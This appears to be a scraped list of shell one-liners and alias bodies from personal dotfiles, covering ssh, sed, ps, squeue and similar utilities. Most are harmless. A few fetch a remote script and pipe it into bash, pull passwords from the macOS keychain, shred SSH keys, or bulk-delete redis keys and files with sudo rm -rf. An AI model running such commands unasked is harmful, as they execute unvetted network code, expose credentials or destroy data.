"ssh iridium 'arecord -f cd -t wav' | play -t wav - compand .01,.01 -inf,-40,-inf,-40,-40 0 -90 .1"
"ssh gadget 'arecord -f cd -t wav' | play -t wav - compand .01,.01 -inf,-40,-inf,-40,-40 0 -90 .1"
"ssh -t octo ""qstat -f | grep rydell"" 2> /dev/null"
"ssh -t flix ""tail -n0 -f /home/drakenot/viking/tells.log"" | while read OUTPUT; do notify-send ""VikingMUD"" ""$OUTPUT""; echo ""$OUTPUT""; done"
"ssh -t chalupa ""screen -ls | grep irc; if [ \$? -eq 0 ]; then screen -dRR irc; else screen -U -S irc; fi"""
"ssh -t `grep -w -i ""Host"" ~/.ssh/config | sed "
"ssh -p 2020 tom@apollo.pack.co.nz /home/tom/scr/fcwho | sort"""
"ssh -p 2020 tom@apollo.pack.co.nz /home/tom/scr/fclast | grep -v Internet"""
"ssh -i ~/.ssh/id_rsa proper-kitada@$(aws --profile ""$APP""_""$ENV""_proper --region ap-northeast-1 ec2 describe-instances | jq "
"ssh $GIT_HOST -p $GIT_PORT 2>/dev/null | grep "" R"" --color=none"
"ssh $(awk ""/Host / { print \$2}"" ~/.ssh/config | fzf)"
"ss | grep ""^[MAD]"""
"squeue -u `whoami` -o ""%.18i %.9P %.j %.2t %.6b %.10M %R %.6D %.C %.J %.L"" | column -t"
"squeue -o ""%.7i %.10u %.12T %.6C %10l %R"" -S ""-T"" -t S,CG,CF,CA,F,TO,PR,NF | hluser"
"squeue -o ""%.7i %.10u %.10a %.8q %.9P %.12j %.6D %.6C %.12L %S"" -S ""L"" -t R | hluser"
"squeue -o ""%.12i %.12P %.25j %.12u %.4t %.10M %.6D %R"" | grep pickemSFB"
"squeue -o ""%.12i %.12P %.12q %.25j %.12u %.4t %.10M %.6D %R"" | grep devel_0128"
"squeue -a -o ""%.16i %.9P %.8j %.8u %.10l %.20S %.2t %.5C %.10m %.10M %.6D %.10R"" | less"
"sqlite3 ~/.local/share/jolla-notes/QML/OfflineStorage/Databases/8b63c31a7656301b3f7bcbbfef8a2b6f.sqlite ""select body from notes;"" | grep"
"sqlite3 ~/.local/share/commhistory/commhistory.db ""select Freetext from Events where type=2;"" | grep"
"sqlite3 ~/.config/darktable/library.db ""select filename from images as i join selected_images as s on s.imgid = i.id;"" | grep RW2"
"sqlite3 -separator "" |"" ~/procrastinate.db"
"sqlite3 -separator "" | """
"spy () { lsof -i -P +c 0 +M | grep -i ""$1"" }"
"spring rspec `find . -type f -name ""*_spec.rb"" | selecta`"
"spotify status | sed -n ""s/Track: //p"""
"source \""\$(ls | grep venv -m 1)/bin/activate\"""
"source .venv/bin/activate; eval $(cat .env | sed -e ""s/^/export /"")"
"source .venv/bin/activate; PS1=""\[\033[0;32m\]\${debian_chroot:+(\$debian_chroot)}(`basename \""$VIRTUAL_ENV\""`)\W\[\033[0;31m\](\$(git branch 2>/dev/null | grep "
"sort /proc/modules | cut -f1 -d"" """
"sort -t "";"" -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history"
"sort -n | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"sort -n | awk '
"sort -n | awk ""{v[i++]=$1;}END {x=int((i+1)/2); if(x<(i+1)/2) print (v[x-1]+v[x])/2; else print v[x-1];}"""
"socklist|sort -u -k7,7 -r"
"slash_fun(){ set -x ; echo -E ""$*"" | sed -e "
"sink_nr=""$(pacmd list-sinks | grep -o "
"sinfo | grep ""et"""
"sinfo -o ""%n %c %D %m %e"" | column -t"
"shuf -n 1 /data/namegen/src/macosMain/resources/street_names.csv | cut -d, -f1"
"shuf -n 1 /data/namegen/src/macosMain/resources/dist.all.last.csv | cut -d, -f1"
"shuf -n 1 /data/namegen/src/macosMain/resources/dist.all.first.csv | cut -d, -f1"
"shred -n 1 -zu /home/browser/.ssh/dsa*; cat /dev/zero | ssh-keygen -t dsa -N """""
"showconf | grep ""SleepManager\.enabled"""
"showSuite() { for f in $(ls -1 --color=never | grep ^0 --color=never); do cat $f/console.log; done; }; \
"share () { port=$1; ifconfig | grep --color -o ""inet 1[079][^ ]*""; twistd -n web --port ${port:-8000} --path .;}; share"
"share () { port=$1; ifconfig | grep --color -o ""inet 1[079][^ ]*""; python -m SimpleHTTPServer ${port:-8000};}; share"
"sh ~/.create_pullreq.sh $(git symbolic-ref --short HEAD | sed -e ""s/[^0-9]//g"")"
"sh -ic ""pgrep \$@ | xargs -r ps -p"" --"
"sh -c ""echo $PS1@`hostname`:`tty | cut -d/ -f 3-`: -B pool07@bl44@titan1: local session terminal: for telnet/s >> ~/tmp/.labels; ls -l ~/tmp/.labels; sleep 4"""
"sh -c ""command du -xhd1 \""\$@\"" | sort -rh"" """""
"sh -c ""cd $(dirname $(git ls-files |grep Vagrantfile)) && vagrant ssh"""
"set|egrep ""^[a-z]"""
"setxkbmap -layout is | echo ""Íslenskt lyklaborð komið í gírinn."""
"setxkbmap -layout gb | echo ""UK keyboard layout activated.\nu wot m8?"""
"set | sed -n 148,158p"
"set | grep ""logs="""
"set | grep ""()"""
"set icon_name = /`echo $cwd |
"set f=""\!*"";/bin/rm -i SCCS/[sp].{`echo $f|/bin/tr -s "" "" ,`} $f"
"set f=""\!*"";/bin/rm -i RCS/{`echo $f|/bin/tr -s "" "" ,`},v $f"
"set CPWD=`pwd`; cd `echo $CPWD | sed -e ""s/\(.*z6\)\(.*\)/\1/"" `; z6tag; cd $CPWD"
"set CPWD=`pwd`; cd `echo $CPWD | sed -e ""s/\(.*z6\)\(.*\)/\1/"" `; make clean -f Makefile.pch; make pch -f Makefile.pch; cd $CPWD"
"set CPWD=`pwd`; cd `echo $CPWD | sed -e ""s/\(.*empyrean\)\(.*\)/\1/"" `; source makesetup.csh; source ~/.panda_alias_64.csh; cd $CPWD"
"set CPWD=`pwd`; cd `echo $CPWD | sed -e ""s/\(.*empyrean\)\(.*\)/\1/"" `"
"service minidlna status;ps -e |sed -n ""/tomb/p;/mpd/p;/java/p;/mini/p"""
"service --status-all | grep -vF ""[ - ]"""
"seq 0 255 | while read i; do printf ""${i-1}: \x1b[48;5;${i}m\n""; sleep .01; done"
"seq -s """" -f ""%4.0f|"" 5 5"
"sensors | grep -v ""N/A"""
"sensors | grep ""CPU Temperature"""
"sed 1i""copy"" | nc localhost 52698"
"sed -re ""s;\), ([a-z]);)\n\1;g"" -e ""s;^(Install|Upgrade): ;\1:\n;"" /var/log/apt/history.log"
"sed -r ""s/^[[:space:]]*|[[:space:]]*$//g"""
"sed -r ""s/^[ \t]*|[ \t]*$//g"""
"sed -r ""s/\x1B\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g"""
"sed -r ""s/\x1B\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g"
"sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"" "
"sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|KG]//g"""
"sed -r ""s/\x1B\[([0-9];)?([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g"" | vim -R -c ""set filetype=log nowrap"" -"
"sed -r ""s/([A-Z]+)/\L\1\E/g;s/(^|\s)([a-z]+)_/ /g;s/_(\w)/\U\1\E/g"""
"sed -nE ""s/\(\) *\{//p"" init.sh | sort"
"sed -n -e ""0,/PROMPT/d"" -e ""s/alias //g"" -e ""s/=\x27/#/g"" -e ""/commands/d"" -e ""s/\x27//p"" $HOME/.bashrc | column -t -s ""#"""
"sed -n -e ""/^\[/h; /priority *=/{ G; s/\n/ /; s/ity=/ity = /; p }"" /etc/yum.repos.d/*.repo | sort -k3n"
"sed -n ""45,62 p"" $JBEXTRAS_FOLDER/tmux.txt | cat"
"sed -n ""33,43 p"" $JBEXTRAS_FOLDER/tmux.txt | cat"
"sed -n ""24,31 p"" $JBEXTRAS_FOLDER/tmux.txt | cat"
"sed -n ""10,22 p"" $JBEXTRAS_FOLDER/tmux.txt | cat"
"sed -n ""1,8 p"" $JBEXTRAS_FOLDER/tmux.txt | cat"
"sed -n ""/esult/,+1p""|awk "
"sed -n ""/^start$/,+1p;/^first$/,+1p;/^param/,+1p;/Result/,+1p"" tune[0-9]|tr "
"sed -n ""/^[a-z,A-Z]/p"" |tr "
"sed -n ""/\!*/p"" tags | sed ""s/ .*//"""
"sed -n ""/$(date +%m\\/%d\\\|%b\*\ %d)/p"" $(find ~/.calendar /usr/share/calendar -maxdepth 1 -type f -name ""c*"" 2>/dev/null);"
"sed -e 's/\\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g'"
"sed -e ""s/diffia/ACME/gi"" -e ""s/$USER/myuser/gi"" -e ""s/nimble/nicecorp/gi"" | indent4 "
"sed -E ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"sed -E ""s/(.{$(tput cols)}).*/\1/;$(($(tput lines)-$(echo -en $PS1 | wc -l)))q"""
"sed 's/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g'"
"sed 's/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g' -r"
"sed 's/,/\t/g' | nkf -w16L"
"sed 's/,/ /g' | wc -w"
"sed 's/ at/\n at/g' | \
"sed '1,2d;$d' | tr -s ' ' "
"sed ""s@+@ @g;s@%@\\\\x@g"" |xargs -0 printf ""%b"""
"sed ""s@+@ @g;s@%@\\\\x@g"" | xargs -0 printf ""%b"""
"sed ""s/^\t/ \t/g;s/\t\t/\t \t/g;s/\t\t/\ty\t/g"" | column -s$"
"sed ""s/\x1B\[\([0-9]\{1,3\}\(\(;[0-9]\{1,3\}\)*\)\?\)\?[m|K]//g"""
"sed ""s/,/\t/g"" ""/usr/share/dnscrypt-proxy/dnscrypt-resolvers.csv"" | less -S"
"sed ""s/,,/, ,/g;s/,,/, ,/g"" | column -s, -t"
"sed ""s/$/,/"" | sed ""$ s/.$//"""
"sed ""s#../#\""ses-1/#"" | sed ""s#.gz#.gz\"",#"""
"sed ""/^[\ \t]\{0,\}#/d"" ""$1"" | sed ""/^[\ \t]\{0,\}$/d"""
"sed ""/^$/d"" TODO | wc -l"
"security find-internet-password -ws ""secure.tesco.com"" | pbcopy"
"security find-generic-password -ga $network_SSID | grep ""password:"""
"security find-generic-password -ga ""$1"" | grep ""password:"""
"secho ""timeout 1\nrexmt 1\nmode octet"" | tftp 127.0.0.1"
"script_dirname=script_record_$(date | sed -e ""s: :_:g"" -e ""s,:,-,g"") && mkdir $script_dirname && cd $script_dirname && script -t 2> timingfile"
"script ~/ttyhis/`tty|sed ""s/\///g""`"
"screen -ls; ps -A -o pid,args,lstart | grep `ps -o ppid -p $$ --no-headers`"
"screen -X hardstatus alwayslastline ""%{= Bk}%H | %-w%{= kB}%n*%t %{-}%+w %= %M %d %D %C %A"""
"screen -S pycharm -d -m bash ~/applications/pycharm/bin/pycharm.sh"" | sudo tee -a ~/.bashrc
"scp `lein do pom, jar | cut -d"" "" -f2` clojars@clojars.org:"
"sccs info | sed -e ""s/.*\///"" -e ""s/,v//"""
"say -v ? | ruby -wne 'print \$_.sub(/\s+en_US.*$/, %q{}).tr(%q{ }, %q{_})'"
"say ""ryan"" | python3 ~/development/blink/blink_script.py --on fuchsia --off firebrick --fade 0.02 --repeat 3 --duration 0.3"
"say ""justin"" | python3 ~/development/blink/blink_script.py --on aqua --off gray --fade 0.02 --repeat 3 --duration 0.3"
"say ""brian"" | python3 ~/development/blink/blink_script.py --on beige --off gray --fade 0.02 --repeat 3 --duration 0.3"
"s diff | vim ""+set nonumber"" -R -"
"rvm use jruby-1.7.11@`grep ruby-gemset .versions.conf | sed ""s/^.*=//""`"
"rvm use `rvm current | sed ""s/^[^@]*\(.*\)/ruby-2.5.3\1/""` --create"
"rvm use `rvm current | sed ""s/^[^@]*\(.*\)/ruby-2.3.0/""` --create"
"runRemotely ""cat /wayfair/data/www/devbuild_compile_errors.json | python -m json.tool"""
"run $(printf ""%s\n"" ""${_run_list[@]}"" | fzf)"
"ruby -r faker -e ""puts Faker::Lorem.paragraph"" | pbcopy"
"ruby -pe ""gsub /\e\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]/, String.new"""
"ruby -e ""require \""date\""; puts Date.commercial( Time.now.year, ARGV[0].to_i|1, 1 ).strftime( \""%d-%m-%Y\"")"""
"ruby -e ""puts \""$(pbpaste)\"""" | pbcopy"
"ruby -e ""p \$stdin.read.split.uniq.join(\""|\"")"""
"rubocop `git ls-files -m | awk ""/\.rb\""`"
"rubocop -a `git ls-files -m | awk ""/\.rb\""`"
"rtw `g | sed ""s/^.\{3\}//""`"
"rtorrent ""$(/usr/bin/ls --color=never -t ~/Downloads/*.torrent | head -n1)"""
"rtmpdump -v -r rtmp://livestfslivefs.fplive.net/livestfslive-live/ -y ""aljazeera_en_veryhigh?videoId=747084146001&lineUpId=&pubId=665003303001&playerId=751182905001&affiliateId="" -W ""http://admin.brightcove.com/viewer/us1.24.04.08.2011-01-14072625/federatedVideoUI/BrightcovePlayer.swf -p ""http://english.aljazeera.net/watch_now/ -a ""aljazeeraflashlive-live?videoId=747084146001&lineUpId=&pubId=665003303001&playerId=751182905001&affiliateId="" | mplayer-uau - -vo xv"
"rtmpdump -v -r ""rtmp://aljazeeraflashlivefs.fplive.net/aljazeeraflashlive-live/aljazeera_eng_med"" | mplayer -"
"rtcontrol -qo '{{chr(10).join([d.directory+chr(47)+x.path for x in d.files])|h.subst(chr(47)+chr(43),chr(47))}}'"
"rtcontrol -q -s alias,message -o alias,message 'message=?*' message=\!*Tried?all?trackers* | uniq -c"
"rtcontrol -q -s alias,message -o alias,message 'message=?*' 'message=!*Tried?all?trackers*' | uniq -c"
"rtcontrol -q -s alias,is_open,message -o alias,is_open,message 'message=?*' message=\!*Tried?all?trackers* | uniq -c"
"rt\|\# alias created by rm install script"" ""/home/$USER/.bashrc"" > tmp"
"rsync -az --dry-run --delete-after --out-format=""[%t]:%o:%f:Last Modified %M"" source destination | ${real_less}"
"rspec ""$(git diff --name-only --cached | grep -i "
"rrr -T | g "":"""
"rpm -qav | grep kernel-[2-4] ; echo -ne ""Current:\nkernel-"" ; uname -r"
"rpm -qa -l --qf ""%{NAME}:\n"" | less"
"rpm -qa --queryformat '%10{SIZE}\t%{NAME}\n' | sort -k1,1n"
"rpm -qa --queryformat ""%{SIZE} %{NAME}\n""|sort -n"
"rpm -qa --queryformat ""%{SIZE} %{NAME}-%{VERSION}-%{RELEASE}\n"" | sort -n"
"rosservice list | grep ""stances/"""
"roslaunch ${LAUNCH_DIR}/body.launch hardware:=""rose21"" 2>&1 | grep -v ""\[pcl::"""
"rm ~/.addressbook; ./pine.sed Yahoo.csv | tr --delete \"" > ~/.addressbook"
"rm `find . | grep -E ""^\..*\.sw[pon]$""`"
"rm TAGS; find . -name ""*.php"" -o -name ""*.phpt"" -o -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.c++"" -o -name ""*.h"" -o -name ""*.hpp"" -o -name ""*.py"" -o -name ""*.pl"" -o -name ""*.pm"" -o -name ""*.java"" -o -name ""*.thrift"" | ctags -L -"
"rm TAGS; find . -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.h"" -o -name ""*.hpp"" | etags -L -"
"rm TAGS; find . -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.h"" -o -name ""*.hpp"" | ctags -L -"
"rm .watchfile ; while sleep 2; do zsh -c ""grep :FR ${PWD##*/}.scf | tail -5 ; echo -- && tail -20 STDOUT ; watchdir 180"" > .watchtmp; clear; cat .watchtmp; done"
"rm -rf ~/Library/Developer/Xcode/DerivedData/* && sudo find /var/folders -name ""*[Xx]code*"" -o -name ""*llvm*"" | xargs sudo rm -rf"
"rm -rf ~/.ievms/IE7* ~/VirtualBox\ VMs/IE7\ -\ WinXP/; curl -s https://raw.github.com/xdissent/ievms/master/ievms.sh | env IEVMS_VERSIONS=""7"" bash"
"rm -rf TAGS; find . -name ""*.js"" | xargs ctags -a -e -f TAGS ;"
"rm -rf .idea && find . -name ""*.iml"" | xargs rm"
"rm -rf $DEVROOT/precheck/jar/hive/*; cp `find $DEVROOT/$HIVEROOT/src -name ""hive*jar"" | grep -v ""tests.jar""` $DEVROOT/precheck/jar/hive/"
"rm -r .pub .dart_tool/pub && echo ""Removed .pub/""; find . -name packages | xargs rm -rf && echo ""Removed packages/""; rm .packages && echo ""Removed .packages""; pubcleanlock"
"rm -i ""$HOME/Music/`mpc --format %file% | head -n1`"" && mpc next &>/dev/null && np"
"rm -f ~/.xsession-errors; setsid startx; while [ ""`jobs | wc -l`"" -ne ""0"" ]; do fg ; done; exit"
"rm -f tags; find . -name ""*.php"" -o -name ""*.phpt"" -o -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.c++"" -o -name ""*.h"" -o -name ""*.hpp"" -o -name ""*.py"" -o -name ""*.pl"" -o -name ""*.pm"" -o -name ""*.java"" -o -name ""*.thrift"" | ctags -L -"
"rm -f tags; find . -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.h"" -o -name ""*.hpp"" | ctags -L -"
"rm -f TAGS; find . -name ""*.java"" -print | xargs etags --append"
"rm -f TAGS; find -L . ~/projects/otp_src_R15B03 -name ""*.?rl"" -print | etags -"
"rm -f /tmp/last_branch; (echo `git branch | sed -n ""/\* /s///p""`) > /tmp/last_branch; git checkout master; git pull --rebase; git checkout `cat /tmp/last_branch`; git rebase master"
"rm $(find ./ | grep "".*~"") &> /dev/null"
"rm $(find -type f -empty | grep -v ""\\$"")"
"rlwrap -c -r -m -b '(){}[].,=&^%$#@\;|' m4"
"rlwrap -c -r -b '(){}[].,=&^%$#@\;|' sml"
"rlwrap -c -r -b '(){}[].,=&^%$#@\;|' scsh"
"rlwrap -c -r -b '(){}[].,=&^%$#@\;|' scheme"
"rlwrap -c -r -b '(){}[].,=&^%$#@\;|' racket"
"rlwrap -c -r -b '(){}[].,=&^%$#@\;|' mit-scheme"
"rlwrap -c -q '""' -b ""'""'(){}[].,#@;|`' -m gosh ""$@"""
"rlwrap -c -q '""' -b ""'""'(){}[].,#@;|`""' -m"
"rlwrap -c -b '(){}.,;|'-a -pGREEN roseus"
"rlwrap -c -b '(){}.,;|' -a -pGREEN roseus"
"rlwrap -b '(){}[],#;| ' gosh"
"rlwrap -b ""(){}[],#\"";| "" v8"
"rlwrap -b ""(){}[],#\"";| "" gosh"
"rlog -l -L *,v | grep -e ""RCS file:"" -e ""locked by:"""
"rlog -L -R -l$USER RCS/* | sed -e ""s/.*\///"" -e ""s/,v//"""
"rlog -L -R -l RCS/* | sed -e ""s/.*\///"" -e ""s/,v//"""
"rlmutil rlmstat -c $TEC360HOME/tecplotlm.lic -a|grep ""handle"""
"riddim -q | less --pattern=""^\*"""
"rg . -n -g ""!*.html"" | fzf --preview=""source $SC/string2arg.sh; string2arg {}"""
"rg . --files -g """" | fzy"
"rg --smart-case --no-line-number --no-heading . |fzf --preview ""head -$LINES {1}"" --delimiter=:"
"rg --null --files --no-ignore-vcs --glob ""*.DS_Store"" $HOME/ | xargs -0 rm --"
"rg --no-heading -C6 ""<<<<<<<"" $(git ls-files | sort -u)"
"rg --hidden --iglob '!{node_modules,.git}' 'TODO|FIXME'"
"rg --hidden --follow --glob ""!({.git,node_modules}/*|*.lock)"""
"rg --files -g ""!node_modules/*"" -g ""!venv/*"" | rg"
"rg --files --hidden -g ""!node_modules/*"" -g ""!venv/*"" -g ""!.git/*"" | rg"
"rg --files --hidden --no-ignore-vcs | rg ""$@"""
"rg ""crypto map OUTSIDE_IPSEC-Policy"" | grep match"
"rev | trrr ""{mirror}{notmirror}"" ""{notmirror}{mirror}"""
"rev | tr ""[ACGT]"" ""[TGCA]"""
"repo=""$(ghq list|peco)""; [ -n ""$repo"" ] && { cd ""$(ghq root)/$repo"" && clear && pwd ; }"
"reg query ""HKCU\Software\Microsoft\Internet Explorer\Desktop\General"" /v WallpaperSource | awk -F\\ ""/REG_SZ/ {print $NF}"""
"redis-cli keys ""*"" | sort"
"redis-cli KEYS ""*"" | xargs redis-cli DEL"
"redis-cli -p 6379 -n 2 keys ""*"" | xargs redis-cli -p 6379 -n 2 del $1"
"rebuild `pwd | sed ""s/.*\///""`"
"read -s -n1 -p ""Do you realy want to quit the shell? [y]|n ""; if [ ""$REPLY"" = y -o ""$REPLY"" = Y -o ""$REPLY"" = "" "" -o ""$REPLY"" = """" ]; then exit; else echo; unset REPLY; fi"
"read -r -p ""WARNING: You are about to force remove all containers across the system? [y/N] "" response; if [[ $response =~ ^([yY][eE][sS]|[yY])$ ]]; then docker rm -fv $(docker ps -q); fi"
"read -p ""[*] Enter content to Base64 Decode: "" material; echo ""$material"" | base64 -d 2> /dev/null"
"read -p ""URL to be deshortened: "" answer && curl -sIL $answer | grep ^Location;"
"read -A<<<"".*.**..*....*** 8 9 5 10 6 0 2 11 7 4"";for C in `date +""%H%M""|fold -w1`;do echo ""${A:${A[C+1]}:4}"";done"
"rclone -h | grep ""Config file"""
"rc=""\n"" && defaults domains | sed s/,/""$rc""/g'"
"random_man|sed -n -e ""/^NAME/{n;p;q;}"""
"rando -c 6 -a 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_@[{}]().,_;:/#^~$%|' 32"
"rake routes | vim - -c "":set nowrap buftype=nofile"""
"rake -T | g "":"""
"qstat hep -t | grep --color=auto ""lpd7"""
"qstat hep -t | grep --color=auto ""$USER"""
"qstat -u ""*"" | less"
"qstat -s r -u ""*"" | awk "
"qstat -f -u ""*"" | grep theo-ox -A 10"
"qlmanage -p ""$@"" &>>| /dev/null"
"qhost | grep ""0\.0"""
"qf | grep all.q@ajisai"""
"q | mo"""
"q | grep @"""
"q | grep -G"""
"q | grep -G ajisai"""
"python3.7 -m http.server 8080 --bind $(ip addr | grep -Po '(?!(inet 127.\d.\d.1))(inet \K(\d{1,3}\.){3}\d{1,3})' )"
"python3"" | tee -a ~/.bash_aliases"
"python3"" | tee -a ${logJob}"
"python3 -c ""import random; print(chr(random.randint(9984,10175)),end=\""\"")"" | tee >(pbcopy); echo"
"python3 -c ""from passlib.hash import sha512_crypt; import getpass; print(sha512_crypt.hash(getpass.getpass()))"" | sed ""s/rounds=[0-9]*.//"""
"python$PYTHON_VERSION"" | tee -a ~/.bash_aliases \"
"python manage.py showmigrations --list --settings=$DJANGO_SETTINGS_MODULE | grep -v ""[X]"""
"python -m json.tool | vim +""set ft=json"" -"
"python -m json.tool | python -c ""import re,sys;chr=__builtins__.__dict__.get(\""unichr\"", chr);sys.stdout.write(re.sub(r\""\\\\u[0-9a-f]{4}\"", lambda x: unichr(int(\""0x\"" + x.group(0)[2:], 16)), sys.stdin.read()))"""
"python -c 'import sys,uuid; sys.stdout.write(uuid.uuid4().hex)' | pbcopy && pbpaste && echo"
"python -c 'import sys,uuid; sys.stdout.write(str(uuid.uuid4()))' | pbcopy && pbpaste && echo"
"python -c ""import uuid;print str(uuid.uuid4())"" | tr -d ""\n"""
"python -c ""import uuid; print(uuid.uuid4().hex)"" | tr -d ""\n"""
"python -c ""import uuid; print(uuid.uuid4())"" | tr -d ""\n"""
"python -c ""import sys;sys.stdout.write(sys.stdin.read().strip())"" | pbcopy"
"python -c ""import sys;import uuid;sys.stdout.write(str(uuid.uuid4()))"" | pbcopy"
"python -c ""import sys; sys.stdout.write(sys.stdin.read().strip())"" | xsel -i -b"
"python -c ""import sys; print(\""\\n\"".join(sys.stdin.read().splitlines()), end=\""\"")"" | pbcopy"
"python -c ""import json; import sys; print(json.dumps(json.load(sys.stdin), indent=2, sort_keys=True))"" | pygmentize -f terminal -l json"
"python -c ""import cv2; print(\""\n\"".join([item for item in dir(cv2)]))"" | grep"
"python -c ""from pyquery import PyQuery as pq; dom=pq(url=\""http://marge.campus.ltu.se/temp/\""); print dom(\""td.px13>pre\"")[0].text.split(\""\n\"")[3].replace(\""|\"",\""\"").strip()"""
"python -c ""from distutils.sysconfig import get_python_lib; print get_python_lib()"" | pbcopy"
"pyroute_activate"" | sudo tee -a .bashrc >/dev/null"
"pygmentize -g -O style=colorful,linenos=1 | grep -P ""^\d\d\d\d:"""
"pyenv versions --skip-aliases --bare | egrep '^[0-9\.]\.[0-9]\.[0-9]{1,2}$'"
"pyenv install -l | egrep '^[ ]+[0-9\.]\.[0-9]\.[0-9]{1,2}$'"
"pydf | grep -v ""snap"""
"pwgen41 ; echo -n ""zz_""$(pbpaste) | pbcopy "
"pwgen -ysB1 -r \""\`\^\$\~\/\%\#\@\|\<\>\:\;"
"pwgen --symbol 15 1 | tr -d ""\n"" > >(pbcopy) > >(cat); echo"
"pwd|xclip"""
"pwd|xclip -selection clipboard"""
"pwd;grep ""Successfully finalized"" ./log.run* -c | grep "":0"""
"pwd | sed s,/home/pandu,~,"
"pwd | sed -e ""s:/:🥖:g"""
"pwd | sed 's,^\(.*/\)\?\([^/]*\),\2,'"
"pwd | sed ""s/^\(.*\)$/"
"pwd | sed ""s/\(\/[^\/]*\/[^\/]*\/[^\/]*\)\(\/[^\/]*\).*\(\/[^\/]*\/[^\/]*\)$/...\3/g"""
"pwd | sed ""s,`echo $home/`,Z:\\,"""
"pwd | sed ""s,^$HOME,~,"""
"pwd | sed ""s,.*$HOME/,,"""
"pwd | pbcopy;echo ""copied `pbpaste` to clipboard"""
"pwd | pbcopy; echo ""$PWD copiado para a área de transferência! Capturar com: cdpwd"""
"pwd | pbcopy && echo ""Path in your clipboard"""
"pw=`openssl rand -base64 12`; printf ""$pw"" | pbcopy; printf ""$pw (copied to clipboard)""; unset pw"
"pw=`cat ~/.ssh/hpc2pw.rsa | openssl rsautl -decrypt -inkey ~/.ssh/id_rsa`;\
"pw=`cat ~/.ssh/hpc2bue_pw.rsa | openssl rsautl -decrypt -inkey ~/.ssh/id_rsa`;\
"pushd `pwd | sed ""s/\/obj-ff//""`"
"pushd `pwd | grep -o "".*OrionPayload""` > /dev/null && `make env` && popd > /dev/null"
"pushd `pwd | cut -d ""/"" -f 1,2,3,4,5`/ext"
"pushd `pwd | cut -d ""/"" -f 1,2,3,4,5`/build/x86-64/debug/etc/debesys/"
"pushd `pwd | cut -d ""/"" -f 1,2,3,4,5`/build/x86-64/debug/bin"
"pushd `pwd | cut -d ""/"" -f 1,2,3,4,5`"
"pushd `echo $* | sed -n 's,\(.*\)/.*,\1,p'`"
"pushd .git-crypt/keys/default/0; for file in *.gpg; do echo ""${file} : "" && git log -- ${file} | sed -n 9p; done; popd"
"pushd . > /dev/null ; pushd -n +1;dirs -v | grep -v ""^ 0"" "
"puppet agent --{summarize,test,debug,evaltrace} | perl -pe ""s/^/localtime().\"": \""/e"""
"pull && fetch && git-merged | grep -v ""\*"""
"pubkey | pbcopy && echo ""Keys copied to clipboard"""
"pu ""$(find . -type d | peco)"""
"pt-query-digest /tmp/mysql-slow.log --explain h=localhost,u=isucon --database=isucon | tee ptqd.log"
"pt """" err.txt generated.file succ.txt | fzf"
"pstree -n -u -G | highlight ""$USER"""
"pstree --ascii --show-parents --show-pids --arguments --highlight-pid=$$ $$ | grep -e """" -e ""${SHELL##*/}"""
"ps=$(ps -eF); head -1 <<< ""$ps""; grep -v ""grep -v"" <<< ""$ps"" | grep -i --color=auto"
"ps xu --sort %mem | sed -e :a -e '1p;\$q;N;6,\$D;ba'"
"ps xawwf -eo pid,user,%cpu,%mem,args | less -S"
"ps xawf -eo ppid,pid,tt,user,group,etime,stat,args | $PAGER"
"ps xawf -eo pid,user,cgroup,args | less"
"ps xawf -eo pid,user,cgroup,args | $PAGER"
"ps xauww | grep ""^${USER}"""
"ps x | grep -v -e ""$(xlsprograms)"" -e ""X11"" -e ""xorg"" -e ""Xorg"" -e ""startx"" -e ""xinit"""
"ps wwaxr -o pid,stat,%cpu,time.command | head -10"
"ps wwaxr -o pid,stat,%cpu,time,name,comm | head -10"
"ps wwaxr -o pid,stat,%cpu,time,command | head -5"
"ps wwaxr -o pid,stat,%cpu,time,command | head -10"
"ps wwaxr -o pid,%cpu,command | head -5"
"ps wwaxm -o pid,stat,vsize,rss,time,command | head -5"
"ps wwaxm -o pid,stat,vsize,rss,time,command | head -10"
"ps wwaxm -o pid,stat,%mem,vsize,rss,time,command | head -10"
"ps wwaxm -o pid,start,vsize,rss,time,command | head -10"
"ps wwaxm -o pid,%cpu,command | head -5"
"ps wwaxf -o user,tty,pid,state,start,time,%cpu,nlwp,ni,pri,%mem,vsz,rsz,command | less -S"
"ps waux | grep ""ssh -f -N"""
"ps uxawf --sort=tty,ppid,pid | head"
"ps mcxo pcpu,pmem,pid,uid,command | head -n $(( LINES - 3 ))"
"ps h -C qemu-system-x86_64,kvm -o args | sed 's/.* -name \+\([^ ]*\).*/\1/'"
"ps faux|perl -ne'use Term::ANSIColor qw(:constants);
"ps ex | awk ""\$3==\""Z\""{print \$1, \$5}"""
"ps axww -o user,pid,%cpu,%mem,ni,tty,stat,start,time,args | \grep -i -e ""^USER"" -e "
"ps axu | grep ""$@"" --ignore-case --color=auto"
"ps axo stat,ppid,pid,comm| grep"
"ps axo stat,ppid,pid,comm | grep -w defunct"
"ps axo rss,pmem,pid,user,command | awk "
"ps axo rss,comm,pid | awk "
"ps axo pid=,stat= | awk '\$2~/^Z/ { print \$1 }'"
"ps axo pid,pcpu,pmem,comm --sort=-rss | head -11"
"ps axo pid,pcpu,pmem,comm --sort=-pcpu| head -11"
"ps axo pid,args | grep"
"ps axj | egrep -v ""[0-9] \[.*\]"""
"ps axf | grep -z ""^PATH"" /proc/[pid]"
